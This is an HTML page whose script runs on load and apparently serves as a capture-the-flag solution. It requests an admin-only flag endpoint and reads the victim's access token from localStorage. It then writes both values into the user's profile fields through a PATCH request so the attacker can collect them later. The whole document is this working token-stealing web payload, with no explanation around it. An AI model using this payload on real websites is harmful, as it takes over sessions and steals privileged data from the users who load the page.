<!DOCTYPE html>
<html>
<body>
<script>
    async function solve() {
        let flag = "Not Found";
        let token = "No Token";

        try {
            // 1. Try to get the flag
            const fReq = await fetch('/api/admin/flag');
            if(fReq.ok) flag = await fReq.text();
            
            // 2. Try to get the session token
            token = localStorage.getItem('accessToken') || "Not in LS";
            
            // 3. SAVE TO PROFILE (The "Notepad")
            await fetch('/api/auth/profile', {
                method: 'PATCH',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    "fullName": "DUMPING_DATA",
                    "phoneNumber": flag.substring(0, 50),
                    "address": {
                        "street": token.substring(0, 50),
                        "city": "Check_JSON_Now",
                        "state": "LB"
                    }
                })
            });
        } catch (e) {}
    }
    solve();
</script>
</body>
</html>
